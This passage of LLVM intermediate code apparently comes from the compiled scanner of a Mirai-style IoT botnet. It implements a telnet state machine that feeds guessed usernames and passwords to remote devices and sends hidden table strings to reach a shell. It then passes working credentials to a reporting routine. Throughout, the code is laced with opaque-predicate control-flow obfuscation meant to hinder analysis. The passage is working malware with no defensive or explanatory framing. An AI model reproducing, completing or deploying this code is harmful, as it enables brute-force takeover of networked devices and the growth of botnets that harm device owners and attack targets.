  %1238 = load i32, i32* %1237, align 8
  switch i32 %1238, label %1610 [
    i32 2, label %1239
    i32 3, label %1247
    i32 4, label %1290
    i32 5, label %1333
    i32 6, label %1369
    i32 7, label %1421
    i32 8, label %1441
    i32 9, label %1477
    i32 10, label %1513
  ]

; <label>:1239:                                   ; preds = %1235
  %1240 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1241 = call i32 @consume_iacs(%struct.scanner_connection* %1240)
  store i32 %1241, i32* %33, align 4
  %1242 = icmp sgt i32 %1241, 0
  br i1 %1242, label %1243, label %1246

; <label>:1243:                                   ; preds = %1239
  %1244 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1245 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1244, i32 0, i32 3
  store i32 3, i32* %1245, align 8
  br label %1246

; <label>:1246:                                   ; preds = %1243, %1239
  br label %1611

; <label>:1247:                                   ; preds = %1235
  %1248 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1249 = call i32 @consume_user_prompt(%struct.scanner_connection* %1248)
  store i32 %1249, i32* %33, align 4
  %1250 = icmp sgt i32 %1249, 0
  br i1 %1250, label %1251, label %1273

; <label>:1251:                                   ; preds = %1247
  %1252 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1252, i32 0, i32 1
  %1254 = load i32, i32* %1253, align 8
  %1255 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1256 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1255, i32 0, i32 0
  %1257 = load %struct.scanner_auth*, %struct.scanner_auth** %1256, align 8
  %1258 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1257, i32 0, i32 0
  %1259 = load i8*, i8** %1258, align 8
  %1260 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1261 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1260, i32 0, i32 0
  %1262 = load %struct.scanner_auth*, %struct.scanner_auth** %1261, align 8
  %1263 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1262, i32 0, i32 4
  %1264 = load i8, i8* %1263, align 4
  %1265 = zext i8 %1264 to i64
  %1266 = call i64 @send(i32 %1254, i8* %1259, i64 %1265, i32 16384)
  %1267 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1268 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1267, i32 0, i32 1
  %1269 = load i32, i32* %1268, align 8
  %1270 = call i64 @send(i32 %1269, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1271 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1272 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1271, i32 0, i32 3
  store i32 4, i32* %1272, align 8
  br label %1273

; <label>:1273:                                   ; preds = %1251, %1247
  %1274 = load i32, i32* @x.53
  %1275 = load i32, i32* @y.54
  %1276 = sub i32 %1274, 1
  %1277 = mul i32 %1274, %1276
  %1278 = urem i32 %1277, 2
  %1279 = icmp eq i32 %1278, 0
  %1280 = icmp slt i32 %1275, 10
  %1281 = or i1 %1279, %1280
  br i1 %1281, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1273
  %1282 = load i32, i32* @x.53
  %1283 = load i32, i32* @y.54
  %1284 = sub i32 %1282, 1
  %1285 = mul i32 %1282, %1284
  %1286 = urem i32 %1285, 2
  %1287 = icmp eq i32 %1286, 0
  %1288 = icmp slt i32 %1283, 10
  %1289 = or i1 %1287, %1288
  br i1 %1289, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %1611

; <label>:1290:                                   ; preds = %1235
  %1291 = load i32, i32* @x.53
  %1292 = load i32, i32* @y.54
  %1293 = sub i32 %1291, 1
  %1294 = mul i32 %1291, %1293
  %1295 = urem i32 %1294, 2
  %1296 = icmp eq i32 %1295, 0
  %1297 = icmp slt i32 %1292, 10
  %1298 = or i1 %1296, %1297
  br i1 %1298, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1290
  %1299 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1300 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1299)
  store i32 %1300, i32* %33, align 4
  %1301 = icmp sgt i32 %1300, 0
  %1302 = load i32, i32* @x.53
  %1303 = load i32, i32* @y.54
  %1304 = sub i32 %1302, 1
  %1305 = mul i32 %1302, %1304
  %1306 = urem i32 %1305, 2
  %1307 = icmp eq i32 %1306, 0
  %1308 = icmp slt i32 %1303, 10
  %1309 = or i1 %1307, %1308
  br i1 %1309, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1301, label %1310, label %1332

; <label>:1310:                                   ; preds = %originalBBpart2212
  %1311 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1312 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1311, i32 0, i32 1
  %1313 = load i32, i32* %1312, align 8
  %1314 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1315 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1314, i32 0, i32 0
  %1316 = load %struct.scanner_auth*, %struct.scanner_auth** %1315, align 8
  %1317 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1316, i32 0, i32 1
  %1318 = load i8*, i8** %1317, align 8
  %1319 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1320 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1319, i32 0, i32 0
  %1321 = load %struct.scanner_auth*, %struct.scanner_auth** %1320, align 8
  %1322 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1321, i32 0, i32 5
  %1323 = load i8, i8* %1322, align 1
  %1324 = zext i8 %1323 to i64
  %1325 = call i64 @send(i32 %1313, i8* %1318, i64 %1324, i32 16384)
  %1326 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1327 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1326, i32 0, i32 1
  %1328 = load i32, i32* %1327, align 8
  %1329 = call i64 @send(i32 %1328, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  %1330 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1331 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1330, i32 0, i32 3
  store i32 5, i32* %1331, align 8
  br label %1332

; <label>:1332:                                   ; preds = %1310, %originalBBpart2212
  br label %1611

; <label>:1333:                                   ; preds = %1235
  %1334 = load i32, i32* @x.53
  %1335 = load i32, i32* @y.54
  %1336 = sub i32 %1334, 1
  %1337 = mul i32 %1334, %1336
  %1338 = urem i32 %1337, 2
  %1339 = icmp eq i32 %1338, 0
  %1340 = icmp slt i32 %1335, 10
  %1341 = or i1 %1339, %1340
  br i1 %1341, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1333
  %1342 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1343 = call i32 @consume_any_prompt(%struct.scanner_connection* %1342)
  store i32 %1343, i32* %33, align 4
  %1344 = icmp sgt i32 %1343, 0
  %1345 = load i32, i32* @x.53
  %1346 = load i32, i32* @y.54
  %1347 = sub i32 %1345, 1
  %1348 = mul i32 %1345, %1347
  %1349 = urem i32 %1348, 2
  %1350 = icmp eq i32 %1349, 0
  %1351 = icmp slt i32 %1346, 10
  %1352 = or i1 %1350, %1351
  br i1 %1352, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1344, label %1353, label %1368

; <label>:1353:                                   ; preds = %originalBBpart2216
  call void @table_unlock_val(i8 zeroext 5)
  %1354 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1354, i8** %34, align 8
  %1355 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1356 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1355, i32 0, i32 1
  %1357 = load i32, i32* %1356, align 8
  %1358 = load i8*, i8** %34, align 8
  %1359 = load i32, i32* %35, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = call i64 @send(i32 %1357, i8* %1358, i64 %1360, i32 16384)
  %1362 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1363 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1362, i32 0, i32 1
  %1364 = load i32, i32* %1363, align 8
  %1365 = call i64 @send(i32 %1364, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1366 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1367 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1366, i32 0, i32 3
  store i32 6, i32* %1367, align 8
  br label %1368

; <label>:1368:                                   ; preds = %1353, %originalBBpart2216
  br label %1611

; <label>:1369:                                   ; preds = %1235
  %1370 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1371 = call i32 @consume_any_prompt(%struct.scanner_connection* %1370)
  store i32 %1371, i32* %33, align 4
  %1372 = icmp sgt i32 %1371, 0
  br i1 %1372, label %1373, label %1404

; <label>:1373:                                   ; preds = %1369
  %1374 = load i32, i32* @x.53
  %1375 = load i32, i32* @y.54
  %1376 = sub i32 %1374, 1
  %1377 = mul i32 %1374, %1376
  %1378 = urem i32 %1377, 2
  %1379 = icmp eq i32 %1378, 0
  %1380 = icmp slt i32 %1375, 10
  %1381 = or i1 %1379, %1380
  br i1 %1381, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1373
  call void @table_unlock_val(i8 zeroext 6)
  %1382 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %1382, i8** %36, align 8
  %1383 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1384 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1383, i32 0, i32 1
  %1385 = load i32, i32* %1384, align 8
  %1386 = load i8*, i8** %36, align 8
  %1387 = load i32, i32* %37, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = call i64 @send(i32 %1385, i8* %1386, i64 %1388, i32 16384)
  %1390 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1391 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1390, i32 0, i32 1
  %1392 = load i32, i32* %1391, align 8
  %1393 = call i64 @send(i32 %1392, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1394 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1395 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1394, i32 0, i32 3
  store i32 7, i32* %1395, align 8
  %1396 = load i32, i32* @x.53
  %1397 = load i32, i32* @y.54
  %1398 = sub i32 %1396, 1
  %1399 = mul i32 %1396, %1398
  %1400 = urem i32 %1399, 2
  %1401 = icmp eq i32 %1400, 0
  %1402 = icmp slt i32 %1397, 10
  %1403 = or i1 %1401, %1402
  br i1 %1403, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %1404

; <label>:1404:                                   ; preds = %originalBBpart2220, %1369
  %1405 = load i32, i32* @x.53
  %1406 = load i32, i32* @y.54
  %1407 = sub i32 %1405, 1
  %1408 = mul i32 %1405, %1407
  %1409 = urem i32 %1408, 2
  %1410 = icmp eq i32 %1409, 0
  %1411 = icmp slt i32 %1406, 10
  %1412 = or i1 %1410, %1411
  br i1 %1412, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1404
  %1413 = load i32, i32* @x.53
  %1414 = load i32, i32* @y.54
  %1415 = sub i32 %1413, 1
  %1416 = mul i32 %1413, %1415
  %1417 = urem i32 %1416, 2
  %1418 = icmp eq i32 %1417, 0
  %1419 = icmp slt i32 %1414, 10
  %1420 = or i1 %1418, %1419
  br i1 %1420, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br label %1611

; <label>:1421:                                   ; preds = %1235
  %1422 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1423 = call i32 @consume_any_prompt(%struct.scanner_connection* %1422)
  store i32 %1423, i32* %33, align 4
  %1424 = icmp sgt i32 %1423, 0
  br i1 %1424, label %1425, label %1440

; <label>:1425:                                   ; preds = %1421
  call void @table_unlock_val(i8 zeroext 4)
  %1426 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1426, i8** %38, align 8
  %1427 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1428 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1427, i32 0, i32 1
  %1429 = load i32, i32* %1428, align 8
  %1430 = load i8*, i8** %38, align 8
  %1431 = load i32, i32* %39, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = call i64 @send(i32 %1429, i8* %1430, i64 %1432, i32 16384)
  %1434 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1435 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1434, i32 0, i32 1
  %1436 = load i32, i32* %1435, align 8
  %1437 = call i64 @send(i32 %1436, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1438 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1439 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1438, i32 0, i32 3
  store i32 8, i32* %1439, align 8
  br label %1440

; <label>:1440:                                   ; preds = %1425, %1421
  br label %1611

; <label>:1441:                                   ; preds = %1235
  %1442 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1443 = call i32 @consume_any_prompt(%struct.scanner_connection* %1442)
  store i32 %1443, i32* %33, align 4
  %1444 = icmp sgt i32 %1443, 0
  br i1 %1444, label %1445, label %1476

; <label>:1445:                                   ; preds = %1441
  %1446 = load i32, i32* @x.53
  %1447 = load i32, i32* @y.54
  %1448 = sub i32 %1446, 1
  %1449 = mul i32 %1446, %1448
  %1450 = urem i32 %1449, 2
  %1451 = icmp eq i32 %1450, 0
  %1452 = icmp slt i32 %1447, 10
  %1453 = or i1 %1451, %1452
  br i1 %1453, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1445
  call void @table_unlock_val(i8 zeroext 7)
  %1454 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1454, i8** %40, align 8
  %1455 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1456 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1455, i32 0, i32 1
  %1457 = load i32, i32* %1456, align 8
  %1458 = load i8*, i8** %40, align 8
  %1459 = load i32, i32* %41, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = call i64 @send(i32 %1457, i8* %1458, i64 %1460, i32 16384)
  %1462 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1463 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1462, i32 0, i32 1
  %1464 = load i32, i32* %1463, align 8
  %1465 = call i64 @send(i32 %1464, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1466 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1467 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1466, i32 0, i32 3
  store i32 9, i32* %1467, align 8
  %1468 = load i32, i32* @x.53
  %1469 = load i32, i32* @y.54
  %1470 = sub i32 %1468, 1
  %1471 = mul i32 %1468, %1470
  %1472 = urem i32 %1471, 2
  %1473 = icmp eq i32 %1472, 0
  %1474 = icmp slt i32 %1469, 10
  %1475 = or i1 %1473, %1474
  br i1 %1475, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %1476

; <label>:1476:                                   ; preds = %originalBBpart2228, %1441
  br label %1611

; <label>:1477:                                   ; preds = %1235
  %1478 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1479 = call i32 @consume_any_prompt(%struct.scanner_connection* %1478)
  store i32 %1479, i32* %33, align 4
  %1480 = icmp sgt i32 %1479, 0
  br i1 %1480, label %1481, label %1496

; <label>:1481:                                   ; preds = %1477
  call void @table_unlock_val(i8 zeroext 8)
  %1482 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1482, i8** %42, align 8
  %1483 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1484 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1483, i32 0, i32 1
  %1485 = load i32, i32* %1484, align 8
  %1486 = load i8*, i8** %42, align 8
  %1487 = load i32, i32* %43, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = call i64 @send(i32 %1485, i8* %1486, i64 %1488, i32 16384)
  %1490 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1491 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1490, i32 0, i32 1
  %1492 = load i32, i32* %1491, align 8
  %1493 = call i64 @send(i32 %1492, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1494 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1495 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1494, i32 0, i32 3
  store i32 10, i32* %1495, align 8
  br label %1496

; <label>:1496:                                   ; preds = %1481, %1477
  %1497 = load i32, i32* @x.53
  %1498 = load i32, i32* @y.54
  %1499 = sub i32 %1497, 1
  %1500 = mul i32 %1497, %1499
  %1501 = urem i32 %1500, 2
  %1502 = icmp eq i32 %1501, 0
  %1503 = icmp slt i32 %1498, 10
  %1504 = or i1 %1502, %1503
  br i1 %1504, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1496
  %1505 = load i32, i32* @x.53
  %1506 = load i32, i32* @y.54
  %1507 = sub i32 %1505, 1
  %1508 = mul i32 %1505, %1507
  %1509 = urem i32 %1508, 2
  %1510 = icmp eq i32 %1509, 0
  %1511 = icmp slt i32 %1506, 10
  %1512 = or i1 %1510, %1511
  br i1 %1512, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %1611

; <label>:1513:                                   ; preds = %1235
  %1514 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1515 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1514)
  store i32 %1515, i32* %33, align 4
  %1516 = load i32, i32* %33, align 4
  %1517 = icmp eq i32 %1516, -1
  br i1 %1517, label %1518, label %1571

; <label>:1518:                                   ; preds = %1513
  %1519 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1520 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1519, i32 0, i32 1
  %1521 = load i32, i32* %1520, align 8
  %1522 = call i32 @close(i32 %1521)
  %1523 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1524 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1523, i32 0, i32 1
  store i32 -1, i32* %1524, align 8
  %1525 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1526 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1525, i32 0, i32 8
  %1527 = load i8, i8* %1526, align 8
  %1528 = add i8 %1527, 1
  store i8 %1528, i8* %1526, align 8
  %1529 = zext i8 %1528 to i32
  %1530 = icmp eq i32 %1529, 10
  br i1 %1530, label %1531, label %1536

; <label>:1531:                                   ; preds = %1518
  %1532 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1533 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1532, i32 0, i32 8
  store i8 0, i8* %1533, align 8
  %1534 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1535 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1534, i32 0, i32 3
  store i32 0, i32* %1535, align 8
  br label %1554

; <label>:1536:                                   ; preds = %1518
  %1537 = load i32, i32* @x.53
  %1538 = load i32, i32* @y.54
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1536
  %1545 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1545)
  %1546 = load i32, i32* @x.53
  %1547 = load i32, i32* @y.54
  %1548 = sub i32 %1546, 1
  %1549 = mul i32 %1546, %1548
  %1550 = urem i32 %1549, 2
  %1551 = icmp eq i32 %1550, 0
  %1552 = icmp slt i32 %1547, 10
  %1553 = or i1 %1551, %1552
  br i1 %1553, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br label %1554

; <label>:1554:                                   ; preds = %originalBBpart2236, %1531
  %1555 = load i32, i32* @x.53
  %1556 = load i32, i32* @y.54
  %1557 = sub i32 %1555, 1
  %1558 = mul i32 %1555, %1557
  %1559 = urem i32 %1558, 2
  %1560 = icmp eq i32 %1559, 0
  %1561 = icmp slt i32 %1556, 10
  %1562 = or i1 %1560, %1561
  br i1 %1562, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1554
  %1563 = load i32, i32* @x.53
  %1564 = load i32, i32* @y.54
  %1565 = sub i32 %1563, 1
  %1566 = mul i32 %1563, %1565
  %1567 = urem i32 %1566, 2
  %1568 = icmp eq i32 %1567, 0
  %1569 = icmp slt i32 %1564, 10
  %1570 = or i1 %1568, %1569
  br i1 %1570, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br label %1609

; <label>:1571:                                   ; preds = %1513
  %1572 = load i32, i32* %33, align 4
  %1573 = icmp sgt i32 %1572, 0
  br i1 %1573, label %1574, label %1608

; <label>:1574:                                   ; preds = %1571
  %1575 = load i32, i32* @x.53
  %1576 = load i32, i32* @y.54
  %1577 = sub i32 %1575, 1
  %1578 = mul i32 %1575, %1577
  %1579 = urem i32 %1578, 2
  %1580 = icmp eq i32 %1579, 0
  %1581 = icmp slt i32 %1576, 10
  %1582 = or i1 %1580, %1581
  br i1 %1582, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1574
  %1583 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1584 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1583, i32 0, i32 4
  %1585 = load i32, i32* %1584, align 4
  %1586 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1587 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1586, i32 0, i32 5
  %1588 = load i16, i16* %1587, align 8
  %1589 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1590 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1589, i32 0, i32 0
  %1591 = load %struct.scanner_auth*, %struct.scanner_auth** %1590, align 8
  call void @report_working(i32 %1585, i16 zeroext %1588, %struct.scanner_auth* %1591)
  %1592 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1593 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1592, i32 0, i32 1
  %1594 = load i32, i32* %1593, align 8
  %1595 = call i32 @close(i32 %1594)
  %1596 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1597 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1596, i32 0, i32 1
  store i32 -1, i32* %1597, align 8
  %1598 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1599 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1598, i32 0, i32 3
  store i32 0, i32* %1599, align 8
  %1600 = load i32, i32* @x.53
  %1601 = load i32, i32* @y.54
  %1602 = sub i32 %1600, 1
  %1603 = mul i32 %1600, %1602
  %1604 = urem i32 %1603, 2
  %1605 = icmp eq i32 %1604, 0
  %1606 = icmp slt i32 %1601, 10
  %1607 = or i1 %1605, %1606
  br i1 %1607, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br label %1608

; <label>:1608:                                   ; preds = %originalBBpart2244, %1571
  br label %1609

; <label>:1609:                                   ; preds = %1608, %originalBBpart2240
  br label %1611

; <label>:1610:                                   ; preds = %1235
  store i32 0, i32* %33, align 4
  br label %1611

; <label>:1611:                                   ; preds = %1610, %1609, %originalBBpart2232, %1476, %1440, %originalBBpart2224, %1368, %1332, %originalBBpart2208, %1246
  %1612 = load i32, i32* @x.53
  %1613 = load i32, i32* @y.54
  %1614 = sub i32 %1612, 1
  %1615 = mul i32 %1612, %1614
  %1616 = urem i32 %1615, 2
  %1617 = icmp eq i32 %1616, 0
  %1618 = icmp slt i32 %1613, 10
  %1619 = or i1 %1617, %1618
  br i1 %1619, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1611
  %1620 = load i32, i32* %33, align 4
  %1621 = icmp eq i32 %1620, 0
  %1622 = load i32, i32* @x.53
  %1623 = load i32, i32* @y.54
  %1624 = sub i32 %1622, 1
  %1625 = mul i32 %1622, %1624
  %1626 = urem i32 %1625, 2
  %1627 = icmp eq i32 %1626, 0
  %1628 = icmp slt i32 %1623, 10
  %1629 = or i1 %1627, %1628
  br i1 %1629, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %1621, label %1630, label %1631

; <label>:1630:                                   ; preds = %originalBBpart2248
  br label %1677

; <label>:1631:                                   ; preds = %originalBBpart2248
  %1632 = load i32, i32* @x.53
  %1633 = load i32, i32* @y.54
  %1634 = sub i32 %1632, 1
  %1635 = mul i32 %1632, %1634
  %1636 = urem i32 %1635, 2
  %1637 = icmp eq i32 %1636, 0
  %1638 = icmp slt i32 %1633, 10
  %1639 = or i1 %1637, %1638
  br i1 %1639, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1631
  %1640 = load i32, i32* %33, align 4
  %1641 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1642 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1641, i32 0, i32 6
  %1643 = load i32, i32* %1642, align 4
  %1644 = icmp sgt i32 %1640, %1643
  %1645 = load i32, i32* @x.53
  %1646 = load i32, i32* @y.54
  %1647 = sub i32 %1645, 1
  %1648 = mul i32 %1645, %1647
  %1649 = urem i32 %1648, 2
  %1650 = icmp eq i32 %1649, 0
  %1651 = icmp slt i32 %1646, 10
  %1652 = or i1 %1650, %1651
  br i1 %1652, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %1644, label %1653, label %1657

; <label>:1653:                                   ; preds = %originalBBpart2252
  %1654 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1655 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1654, i32 0, i32 6
  %1656 = load i32, i32* %1655, align 4
  store i32 %1656, i32* %33, align 4
  br label %1657

; <label>:1657:                                   ; preds = %1653, %originalBBpart2252
  %1658 = load i32, i32* %33, align 4
  %1659 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1660 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1659, i32 0, i32 6
  %1661 = load i32, i32* %1660, align 4
  %1662 = sub nsw i32 %1661, %1658
  store i32 %1662, i32* %1660, align 4
  %1663 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1663, i32 0, i32 7
  %1665 = getelementptr inbounds [256 x i8], [256 x i8]* %1664, i32 0, i32 0
  %1666 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1667 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1666, i32 0, i32 7
  %1668 = getelementptr inbounds [256 x i8], [256 x i8]* %1667, i32 0, i32 0
  %1669 = load i32, i32* %33, align 4
  %1670 = sext i32 %1669 to i64
  %1671 = getelementptr inbounds i8, i8* %1668, i64 %1670
  %1672 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1673 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1672, i32 0, i32 6
  %1674 = load i32, i32* %1673, align 4
  %1675 = sext i32 %1674 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1665, i8* %1671, i64 %1675, i32 1, i1 false)
  br label %1676

; <label>:1676:                                   ; preds = %1657
  br label %1235

; <label>:1677:                                   ; preds = %1630
  br label %1052

; <label>:1678:                                   ; preds = %originalBBpart2204, %originalBBpart2179
